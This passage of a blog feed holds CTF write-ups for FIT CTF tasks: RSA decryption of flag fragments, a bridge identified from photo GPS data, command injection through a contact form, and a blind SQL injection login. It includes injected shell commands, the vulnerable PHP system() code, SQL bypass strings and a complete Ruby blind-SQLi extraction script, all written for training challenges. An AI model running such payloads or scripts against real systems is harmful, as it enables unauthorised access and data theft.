class="number">_</span>&#125;</span> -q <span class="subst">#&#123;q<span class="number">_</span>&#125;</span>`</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">keys.each_with_index <span class="keyword">do</span> <span class="params">|k, i|</span></div><div class="line">    puts <span class="string">"key<span class="subst">#&#123;i+<span class="number">1</span>&#125;</span>:"</span></div><div class="line">    p<span class="number">_</span>, q<span class="number">_</span> = get_pq(k)</div><div class="line">    write_key_pem(p<span class="number">_</span>,q<span class="number">_</span>,i+<span class="number">1</span>)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>Here is the output of my script:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">key1:</div><div class="line">n: 8741815859436417328701496607875318191936401767</div><div class="line">p: 62327402947945346311733</div><div class="line">q: 140256379152159036259499</div><div class="line">key2:</div><div class="line">n: 269179849221158109026551637984026302390474511</div><div class="line">p: 14414794469577771744263</div><div class="line">q: 18673859678627990887097</div><div class="line">key3:</div><div class="line">n: 1288098196172411883559600628392142705366290897</div><div class="line">p: 35304226904821143403853</div><div class="line">q: 36485665006773148185749</div><div class="line">key4:</div><div class="line">n: 2082211985167937929231221000305276937818836633</div><div class="line">p: 35841260054322958986347</div><div class="line">q: 58095390117758818595339</div><div class="line">key5:</div><div class="line">n: 594874755164348689388321012976760936405044127</div><div class="line">p: 15907423136267341555433</div><div class="line">q: 37396047748808130517319</div><div class="line">key6:</div><div class="line">n: 20225653762860501316298024024116880883063910969</div><div class="line">p: 138769550589434889129983</div><div class="line">q: 145749940653049615039943</div><div class="line">key7:</div><div class="line">n: 2263052140251833682660205913396239536442594087</div><div class="line">p: 32133336765473179918313</div><div class="line">q: 70426926303011627974799</div></pre></td></tr></table></figure></p>
+<p>Now let's decipher flag's fragments:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key1.pem; cat plaintext</div><div class="line">vc7tJ</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key2.pem; cat plaintext</div><div class="line">ohvwv</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key3.pem; cat plaintext</div><div class="line">FIT&#123;</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key4.pem; cat plaintext</div><div class="line">Zyapo</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key5.pem; cat plaintext</div><div class="line">__dOSA</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key6.pem; cat plaintext</div><div class="line">Ai85Z</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in fit -out plaintext -inkey key7.pem; cat plaintext</div><div class="line">J1RuW&#125;</div></pre></td></tr></table></figure></p>
+<p>Now I need to re-order flag's fragments.</p>
+<p>But look! Foldername looks like a hash:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ hashid 39BCC1930B969051426F5864F24B478CEAFBA7D8</div><div class="line">Analyzing &apos;39BCC1930B969051426F5864F24B478CEAFBA7D8&apos;</div><div class="line">[+] SHA-1</div><div class="line">[+] Double SHA-1</div><div class="line">[+] RIPEMD-160</div><div class="line">[+] Haval-160</div><div class="line">[+] Tiger-160</div><div class="line">[+] HAS-160</div><div class="line">[+] LinkedIn</div><div class="line">[+] Skein-256(160)</div><div class="line">[+] Skein-512(160)</div></pre></td></tr></table></figure></p>
+<p>So its probably SHA1.</p>
+<p>Now I used <a href="https://hashkiller.co.uk/sha1-decrypter.aspx" target="_blank" rel="external">hashkiller</a> to break them:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">39bcc1930b969051426f5864f24b478ceafba7d8 SHA1 : v6</div><div class="line">59e859397b1ab522aaf698d9d42d5f064fd11381 SHA1 : v5</div><div class="line">5a6df720540c20d95d530d3fd6885511223d5d20 SHA1 : v1</div><div class="line">8090fd368c8382fd4b216c5baa04c99769dfcc49 SHA1 : v4</div><div class="line">a1047eab1035d58682a53557e0b2a75edbfd15fd SHA1 : v2</div><div class="line">c5e31d5915661de4393e3f1489b00ebc4497dd48 SHA1 : v3</div><div class="line">c9cf2ef3ad15705851d02c005b381171af921bd7 SHA1 : v7</div></pre></td></tr></table></figure></p>
+<p>So in order:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ cat 5A6DF720540C20D95D530D3FD6885511223D5D20/plaintext</div><div class="line">FIT&#123;</div><div class="line"></div><div class="line">$ cat A1047EAB1035D58682A53557E0B2A75EDBFD15FD/plaintext</div><div class="line">__dOSA</div><div class="line"></div><div class="line">$ cat C5E31D5915661DE4393E3F1489B00EBC4497DD48/plaintext</div><div class="line">Ai85Z</div><div class="line"></div><div class="line">$ cat 8090FD368C8382FD4B216C5BAA04C99769DFCC49/plaintext</div><div class="line">Zyapo</div><div class="line"></div><div class="line">$ cat 59E859397B1AB522AAF698D9D42D5F064FD11381/plaintext</div><div class="line">ohvwv</div><div class="line"></div><div class="line">$ cat 39BCC1930B969051426F5864F24B478CEAFBA7D8/plaintext</div><div class="line">vc7tJ</div><div class="line"></div><div class="line">$ cat C9CF2EF3AD15705851D02C005B381171AF921BD7/plaintext</div><div class="line">J1RuW&#125;</div></pre></td></tr></table></figure></p>
+<p>So our flag is: <code>FIT{__dOSAAi85ZZyapoohvwvvc7tJJ1RuW}</code>.</p>
+<p>But it is incorrect!! What a troll!</p>
+<p>Warning big guessing!!! Remove all double letters to get:  <code>FIT{__dOSAi85Zyapohvwvc7tJ1RuW}</code>.</p>
+<h2 id="150-sorry-web">150 - Sorry - Web</h2>
+<blockquote>
+<p>Flag is right there.</p>
+<p><a href="https://sorry.problem.ctf.nw.fit.ac.jp/" target="_blank" rel="external">https://sorry.problem.ctf.nw.fit.ac.jp/</a></p>
+</blockquote>
+<p>There is a command shell injection the contact form: <a href="https://sorry.problem.ctf.nw.fit.ac.jp/form.html" target="_blank" rel="external">https://sorry.problem.ctf.nw.fit.ac.jp/form.html</a></p>
+<p>For example sendingg the following payload <code>ls -lA;#</code> resultats into:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">total 28</div><div class="line">-r-x---r-x 1 root root   0 Apr 11 00:04 damy.txt</div><div class="line">-r-x---r-x 1 root root  40 Apr 11 00:04 eng.txt</div><div class="line">-r-x---r-x 1 root root 462 Apr 11 00:04 form.html</div><div class="line">-r-x---r-x 1 root root 250 Apr 11 00:04 from.css</div><div class="line">-r-x---r-x 1 root root   0 Apr 11 00:04 in.css</div><div class="line">-r-x---r-x 1 root root 181 Apr 11 00:04 in.php</div><div class="line">-r-x---r-x 1 root root   0 Apr 11 00:04 in.pjp</div><div class="line">-r-x---r-x 1 root root 170 Apr 11 00:04 index.css</div><div class="line">-r-x---r-x 1 root root 811 Apr 11 00:04 index.php</div><div class="line">-r-x---r-x 1 root root  58 Apr 11 00:04 jpn.txt</div><div class="line">-r-x---r-x 1 root root  58 Apr 11 00:04 jpn.txtls -lA;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<p>I'm just curious, <code>cat index.php;#</code> gives:</p>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$name_i = $_GET[<span class="string">'name'</span>];</div><div class="line">$ka = <span class="string">".txt"</span>;</div><div class="line">$text_file = $name_i.$ka;</div><div class="line"></div><div class="line">$name_j = file_get_contents($text_file);;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $name_j;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
+<p>And <code>cat in.php;#</code> gives:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$com = $_POST[&apos;etc&apos;];</div><div class="line">$mail = &apos;:mail@example.com&apos;;</div><div class="line">$mc = $com.$mail;</div><div class="line"></div><div class="line">function jug($mc)&#123;</div><div class="line"></div><div class="line">    echo system($mc);</div><div class="line">    echo $mc.&apos; &apos;.&apos;&lt;br&gt;&apos;.&apos;Saved it thank you!!&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">jug($mc);</div><div class="line">?&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">cat in.php;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<p>Now let's find the flag:</p>
+<p><code>ls -lA /tmp/;#</code>:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">total 8</div><div class="line">drwxrwxrwt 2 root   root   4096 Apr  9 20:31 .ICE-unix</div><div class="line">-rwxr-xr-x 1 root   root     23 Apr 11 00:04 .flag</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 07:07 a.php</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 07:06 a.php*</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 03:21 bee-shell.php</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 01:52 lol2.txt</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 06:06 shell.php</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 06:06 shell.phpls -lA /tmp/;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<p><code>cat /tmp/.flag</code> gives us <code>FIT{fdsa__dasdas_32fa}</code>.</p>
+<p>Another method is <code>grep -r 'FIT{' /*#</code>:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/dev/shm/lol.txt:FIT&#123;fdsa__dasdas_32fa&#125;</div><div class="line">/dev/shm/lol.txt:FIT&#123;fdsa__dasdas_32fa&#125;</div><div class="line">Binary file /proc/17860/task/17860/cmdline matches</div><div class="line">Binary file /proc/17860/task/17860/cmdline matchesgrep -r &apos;FIT&#123;&apos; /*;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<h2 id="50-be-a-stalker-recon">50 - Be a stalker - Recon</h2>
+<p>Twitter account: <a href="https://twitter.com/FitHack_CTF" target="_blank" rel="external">https://twitter.com/FitHack_CTF</a></p>
+<p>Profile picture:</p>
+<p><img src="https://pbs.twimg.com/profile_images/834301095476228098/1wivmfqi.jpg" alt=""></p>
+<p>Flag is <code>FIT{DrPepper}</code>.</p>
+<h2 id="100-specific-recon">100 - Specific - Recon</h2>
+<blockquote>
+<p>This picture was taken from the top of the bridge.</p>
+<p>Please specify the name of the bridge in lowercase letters of Roman letters.</p>
+<p>Flag format is FIT{[answer]}</p>
+<p><a href="https://ctf.nw.fit.ac.jp/files/88309a0cb116e29f3ba062a7f9243d6a/photo.zip" target="_blank" rel="external">photo.zip</a></p>
+</blockquote>
+<p>I checked exif metadata and there were GPS location:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ exiftool photo.jpg | grep -i gps</div><div class="line">GPS Latitude Ref                : North</div><div class="line">GPS Longitude Ref               : East</div><div class="line">GPS Time Stamp                  : 00:50:28</div><div class="line">GPS Date Stamp                  : 2017:02:19</div><div class="line">GPS Date/Time                   : 2017:02:19 00:50:28Z</div><div class="line">GPS Latitude                    : 31 deg 49&apos; 25.90&quot; N</div><div class="line">GPS Longitude                   : 130 deg 18&apos; 52.86&quot; E</div><div class="line">GPS Position                    : 31 deg 49&apos; 25.90&quot; N, 130 deg 18&apos; 52.86&quot; E</div></pre></td></tr></table></figure></p>
+<p>So I looked at <a href="http://www.findlatitudeandlongitude.com/?lat=31.823861&amp;lon=130.314683&amp;zoom=&amp;map_type=ROADMAP" target="_blank" rel="external">findlatitudeandlongitude.com</a> the GPS position.</p>
+<p>The approximate address is: <em>36-17 Higashiōshōjichō, Satsumasendai-shi, Kagoshima-ken 895-0075, Japan</em> from the brigde the picture is taken from.</p>
+<p>The bridge is over <em>Sendai River</em>.</p>
+<p>I looked at the bridge on different websites, but othing on Google Maps, Bing Map, Yandex Map, OpenStreetMap, HERE, MapQuest, <a href="http://mapy.cz" target="_blank" rel="external">mapy.cz</a>, Wikimapia, GeoHack.</p>
+<p>After on <a href="https://tools.wmflabs.org/geohack/geohack.php?language=en&amp;pagename=%E8%A5%BF%E5%90%91%E7%94%B0%E7%94%BA&amp;params=31_48_58.8_N_130_18_20.1_E_type:city" target="_blank" rel="external">geohack</a> I saw there was specialized maps for certain country, so I tried japan only map services: Mapion, MapFan Web, Yahoo! Japan, Goo, Its-mo Guide.</p>
+<p>There was the name but in Japan (Kanji) charaters.</p>
+<p>During this time, I found the name <em>tentai-bashi bridge</em> on an random website so I tried <code>FIT{tentai-bashi}</code>, <code>FIT{tentai_bashi}</code> and <code>FIT{tentai}</code> and then gave up, thinking that was not the good flag (no spoil now, it was lucky this was a random not famous site).</p>
+<p>So I came back to one of the japan specialized map <a href="https://travel.mapfan.com/lang/en/spot/654" target="_blank" rel="external">mapfan</a> and others.</p>
+<p>I took screenshot of the 3 charaters:</p>
+<p><img src="http://i.imgur.com/ZO6TTDY.png" alt="">
+<img src="http://i.imgur.com/GcNpPh9.png" alt="">
+<img src="http://i.imgur.com/iZnt9FB.png" alt="">
+<img src="http://i.imgur.com/Wag7wi7.png" alt=""></p>
+<p>Then I zoomed and tried hand written recognition: <a href="http://kanji.sljfaq.org/" target="_blank" rel="external">http://kanji.sljfaq.org/</a></p>
+<p>That didn't work at all, there a lot of same character that look nearly the same.</p>
+<p>Then I thought about OCR.</p>
+<p>I tried <a href="http://www.i2ocr.com/free-online-japanese-ocr" target="_blank" rel="external">http://www.i2ocr.com/free-online-japanese-ocr</a> tha tworked badly and gave me only of the 3 chars: <code>天</code> and <code>橋</code>. I found the third with hand written recognition <code>六</code>.</p>
+<p>Google translate to english:</p>
+<ul>
+<li>天六橋 -&gt; Heaven Bridge (Tenroku-bashi)</li>
+</ul>
+<p>Now we need Roman representation of Kanji, not english translation:</p>
+<p>So I tried <a href="http://nihongo.j-talk.com/" target="_blank" rel="external">http://nihongo.j-talk.com/</a> that gave me:</p>
+<ul>
+<li>Kanji =&gt; Rōmaji
+<ul>
+<li>天六 -&gt; Ten roku</li>
+<li>天六橋 -&gt; Ten roku kyō</li>
+</ul>
+</li>
+<li>Kanji -&gt; Roumaji
+<ul>
+<li>天六橋 -&gt; Ten roku kyou</li>
+</ul>
+</li>
+</ul>
+<p>But nothing was the flag.</p>
+<p>The 2nd char doesn't looks exactly the same, in fact the good one is <code>大</code> not <code>六</code>.</p>
+<p>Thanks to <a href="http://maggie.ocrgrid.org/nhocr/" target="_blank" rel="external">http://maggie.ocrgrid.org/nhocr/</a> I found the good one.</p>
+<p>So we have now <code>天大橋</code> in Kanji.</p>
+<p><a href="https://translate.google.fr/#ja/en/%E5%A4%A9%E5%A4%A7%E6%A9%8B" target="_blank" rel="external">Google translate</a> gave me:</p>
+<ul>
+<li>天大橋 -&gt; Heaven Bridge (Tentaibashi)</li>
+</ul>
+<p><code>FIT{tentaibashi}</code> is the good flag. I was soooooo near I tried <code>FIT{tentai-bashi}</code>.</p>
+<p>I tried again (with the good 2nd char this time) <a href="http://nihongo.j-talk.com/:" target="_blank" rel="external">http://nihongo.j-talk.com/:</a></p>
+<ul>
+<li>Kanji -&gt; Rōmaji
+<ul>
+<li>天大橋 -&gt; Ten ōhashi</li>
+</ul>
+</li>
+<li>Kanji -&gt; Roumaji
+<ul>
+<li>天大橋 -&gt; Ten oohashi</li>
+</ul>
+</li>
+</ul>
+<p>But the roman translation was not the one I was looking for.</p>
+<p>Meanwhile, CTF orga released twohint:</p>
+<ul>
+<li>Hint 1: Google street view</li>
+<li>Hint 2: Google translate from picture</li>
+</ul>
+<p>Early I tried to find the name of the bridge on Google Street View but didn't found it.</p>
+<h2 id="150-let-s-login-web">150 - Let's login - Web</h2>
+<blockquote>
+<p>I created a page with a login function, but it seems to be vulnerable.</p>
+<p><a href="https://login.problem.ctf.nw.fit.ac.jp" target="_blank" rel="external">https://login.problem.ctf.nw.fit.ac.jp</a></p>
+</blockquote>
+<p>Here is the login page: <a href="https://login.problem.ctf.nw.fit.ac.jp/login.php" target="_blank" rel="external">https://login.problem.ctf.nw.fit.ac.jp/login.php</a></p>
+<p>Using these credentials:</p>
+<ul>
+<li>pseudo: <code>' or 1=1 -- -</code></li>
+<li>password: <code>a</code></li>
+</ul>
+<p>Gave me the following message:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Password is a flag</div><div class="line">Table name: user</div><div class="line">Column name: name, pass</div></pre></td></tr></table></figure></p>
+<p>Thanks for the help.</p>
+<p>Now let's try a different payload <code>' or 1=1#</code>, That give me a blank page.</p>
+<p>So I think this is a blind SQLi where we have the hint message when the request is true and a blank page when false (or auth failure).</p>
+<p>Lets write a blind SQL injection script in ruby.</p>
+<p>So we want a payload like this <code>' or 1=1 UNION select name,pass from user-- -</code>.</p>
+<p>To get the content we will need some SQLite features (because yes it's an SQLite database):</p>
+<ul>
+<li><code>length(str)</code> = to retrieve strings length</li>
+<li><code>substr( string, start_position, [ length ] )</code> and sub-queries to retrieve strings content</li>
+</ul>
+<p>' or length((select name from user limit 1)) &lt; 1-- -
+' or length((select pass from user limit 1)) &lt; 1-- -</p>
+<p>Here is my script:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">require &apos;net/https&apos;</div><div class="line"># uri is already require by net/https</div><div class="line"></div><div class="line">uri = URI(&apos;https://login.problem.ctf.nw.fit.ac.jp/login.php&apos;)</div><div class="line"></div><div class="line">req = Net::HTTP::Post.new(uri.path)</div><div class="line">#req.set_form_data(&apos;name&apos; =&gt; payload, &apos;pass&apos; =&gt; &apos;vuln&apos;)</div><div class="line"></div><div class="line">http = Net::HTTP.new(uri.host, uri.port)</div><div class="line">http.use_ssl = true</div><div class="line">http.verify_mode = OpenSSL::SSL::VERIFY_NONE</div><div class="line">#res = http.request(req)</div><div class="line"></div><div class="line">&lt;&lt;-DOC</div><div class="line">Check is the payload expression is true or false.</div><div class="line">DOC</div><div class="line"></div><div class="line">def check_expression(uri, http, req, payload)</div><div class="line">  req.set_form_data(&apos;name&apos; =&gt; payload, &apos;pass&apos; =&gt; &apos;vuln&apos;)</div><div class="line">  res = http.request(req)</div><div class="line">  return /Password is a flag/.match?(res.body)</div><div class="line">end</div><div class="line"></div><div class="line">&lt;&lt;-DOC</div><div class="line">Get the length of the string.</div><div class="line">There is two level of increment: 10 by 10 (to be faster) and then 1 by 1 (to get the exact size).</div><div class="line">DOC</div><div class="line"></div><div class="line">def get_length(uri, http, req, payload)</div><div class="line">  i = 10</div><div class="line">  while true</div><div class="line">    if check_expression(uri, http, req, payload % i)</div><div class="line">      (i-10..i).each do |j|</div><div class="line">        if check_expression(uri, http, req, payload % j)</div><div class="line">          #puts &quot;Found length = #&#123;j&#125;&quot;</div><div class="line">          return j-1</div><div class="line">        end</div><div class="line">      end</div><div class="line">    end</div><div class="line">    i += 10</div><div class="line">  end</div><div class="line">end</div><div class="line"></div><div class="line">&lt;&lt;-DOC</div><div class="line"></div><div class="line">DOC</div><div class="line"></div><div class="line">def read_string(uri, http, req, length, wanted)</div><div class="line">  content = &quot;&quot;</div><div class="line">  ascii_printable = (&quot; &quot;..&quot;~&quot;).to_a.push(&quot;\n&quot;)  # (&quot; &quot;..&quot;~&quot;) == all printable char == from 0x20 to 0x7e in ASCII Table</div><div class="line">  puts &quot;Beginning to retrive content&quot;</div><div class="line">  while content.length &lt; length</div><div class="line">    ascii_printable.each do |c|</div><div class="line">      tmp = content + c</div><div class="line">      # SQLite tip: 1st position in a string is 1</div><div class="line">      payload = &quot;&apos; or substr((SELECT #&#123;wanted&#125; FROM user LIMIT 1), #&#123;tmp.length&#125;, 1) == \&quot;#&#123;tmp[tmp.length-1]&#125;\&quot;-- -&quot;</div><div class="line">      if check_expression(uri, http, req, payload)</div><div class="line">        content += c</div><div class="line">        puts content</div><div class="line">        break</div><div class="line">      elsif c == &quot;\n&quot;</div><div class="line">          content += &quot;*&quot;  # &quot;*&quot; if no ascii_printable found else we get an infinite loop</div><div class="line">      end</div><div class="line">    end</div><div class="line">  end</div><div class="line">  return content</div><div class="line">end</div><div class="line"></div><div class="line">payload = &quot;&apos; or length((SELECT name FROM user LIMIT 1)) &lt; %i-- -&quot;</div><div class="line">name_length = get_length(uri, http, req, payload)</div><div class="line">puts &quot;Name length: #&#123;name_length&#125;&quot;</div><div class="line"></div><div class="line">payload = &quot;&apos; or length((SELECT pass FROM user LIMIT 1)) &lt; %i-- -&quot;</div><div class="line">password_length = get_length(uri, http, req, payload)</div><div class="line">puts &quot;Password length: #&#123;password_length&#125;&quot;</div><div class="line"></div><div class="line">name = read_string(uri, http, req, name_length, &apos;name&apos;)</div><div class="line">puts &apos;Name: &apos;.concat(name)</div><div class="line"></div><div class="line">password = read_string(uri, http, req, password_length, &apos;pass&apos;)</div><div class="line">puts &apos;Password: &apos;.concat(password)</div></pre></td></tr></table></figure></p>
+<p>And here is the result.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$ ruby auth.rb</div><div class="line">Name length: 5</div><div class="line">Password length: 21</div><div class="line">Beginning to retrive content</div><div class="line">a</div><div class="line">ad</div><div class="line">adm</div><div class="line">admi</div><div class="line">admin</div><div class="line">Name: admin</div><div class="line">Beginning to retrive content</div><div class="line">F</div><div class="line">FI</div><div class="line">FIT</div><div class="line">FIT&#123;</div><div class="line">FIT&#123;9</div><div class="line">FIT&#123;9n</div><div class="line">FIT&#123;9n8</div><div class="line">FIT&#123;9n89</div><div class="line">FIT&#123;9n89_</div><div class="line">FIT&#123;9n89_y</div><div class="line">FIT&#123;9n89_y0</div><div class="line">FIT&#123;9n89_y0u</div><div class="line">FIT&#123;9n89_y0u3</div><div class="line">FIT&#123;9n89_y0u3u</div><div class="line">FIT&#123;9n89_y0u3u_</div><div class="line">FIT&#123;9n89_y0u3u_9</div><div class="line">FIT&#123;9n89_y0u3u_9a</div><div class="line">FIT&#123;9n89_y0u3u_9a8</div><div class="line">FIT&#123;9n89_y0u3u_9a81</div><div class="line">FIT&#123;9n89_y0u3u_9a811</div><div class="line">FIT&#123;9n89_y0u3u_9a811&#125;</div><div class="line">Password: FIT&#123;9n89_y0u3u_9a811&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+    
+      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
+    
+      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
+    
+      <category term="recon" scheme="https://rawsec.ml/tags/recon/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Egypt &amp; UAE National Cyber Security CTF Quals 2017 - Write-ups</title>
+    <link href="https://rawsec.ml/en/Egypt-UAE-National-Cyber-Security-CTF-2017-Quals-write-ups/"/>
+    <id>https://rawsec.ml/en/Egypt-UAE-National-Cyber-Security-CTF-2017-Quals-write-ups/</id>
+    <published>2017-04-09T22:00:00.000Z</published>
+    <updated>2017-04-09T22:53:12.555Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
